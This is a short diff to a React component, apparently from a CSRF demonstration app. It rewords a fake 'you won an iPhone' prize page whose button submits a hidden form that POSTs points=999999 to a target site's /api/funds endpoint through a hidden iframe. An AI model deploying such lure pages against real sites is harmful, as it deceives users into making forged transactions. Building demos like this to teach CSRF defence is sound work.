@@ -10,10 +10,13 @@ class CsrfPage extends React.Component {
         return (
             <div className={s.wrapper}>
                 <div className={s.iphone}></div>
+                <h4 className={s.title}>恭喜你贏得 iPhone 大獎</h4>
+                <div className={s.iphone_btn}>
                 <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                     <input type="hidden" name="points" value="999999"/>
-                    <input type="submit" className="span4 btn btn-primary" value="點我贏得 iphone 大獎!"/>
+                    <input type="submit" className="span4 btn btn-primary" value="立刻領取！"/>
                 </form>
+                </div>
             </div>);
     }
 }
